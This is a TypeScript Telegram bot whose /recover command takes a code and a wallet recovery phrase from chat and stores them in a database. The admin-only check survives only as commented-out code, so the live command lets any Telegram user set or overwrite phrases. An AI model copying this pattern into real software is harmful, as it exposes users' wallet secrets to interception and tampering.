import { Telegraf } from 'telegraf';
import { message } from 'telegraf/filters';
import dotenv from 'dotenv';
import { saveRecoveryPhrase } from '../src/lib/prisma';
dotenv.config();

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN || '');

bot.start((ctx) => ctx.reply('Welcome'));
bot.help((ctx) => ctx.reply('Send me a sticker'));
bot.on(message('sticker'), (ctx) => ctx.reply('👍')); // 
bot.hears('hi', (ctx) => ctx.reply('Hey there'));


bot.command('recover', async (ctx) => {
    const code = ctx.message.text.split(' ')[1];
    const phrase = ctx.message.text.split(' ').slice(2).join(' ');

    if (!code || !phrase) {
        return ctx.reply("❗ Invalid format. Use: /recover <code> <phrase>");
    }

    try {
        // await saveRecoveryPhrase(code, phrase); // Your DB logic
        const res = await saveRecoveryPhrase(code, phrase); // Implement this
        if (res.status !== 200) {
            return ctx.reply(res.message ? res.message : `❌ Failed to save recovery phrase for code: ${code}`);
        } else {
            return ctx.reply(`✅ Recovery phrase set for code: ${code}`);
        }
    } catch (error) {
        console.error(error);
        ctx.reply(`❌ Failed to save recovery phrase for code: ${code}`);
    }
}
);

bot.launch();


// const ALLOWED_ADMINS = [123456789]; // Telegram user IDs allowed to run commands

// bot.onText(/\/recover (\S+) (.+)/, async (msg, match) => {
//   const senderId = msg.from?.id;
//   if (!ALLOWED_ADMINS.includes(senderId)) {
//     return bot.sendMessage(msg.chat.id, "🚫 You are not authorized to use this command.");
//   }

//   const code = match?.[1];
//   const phrase = match?.[2];

//   if (!code || !phrase) {
//     return bot.sendMessage(msg.chat.id, "❗ Invalid format. Use: /recover <code> <phrase>");
//   }

//   try {
//     await saveRecoveryPhrase(code, phrase); // Your DB logic
//     bot.sendMessage(msg.chat.id, `✅ Recovery phrase set for code: ${code}`);
//   } catch (error) {
//     console.error(error);
//     bot.sendMessage(msg.chat.id, `❌ Failed to save recovery phrase for code: ${code}`);
//   }
// });
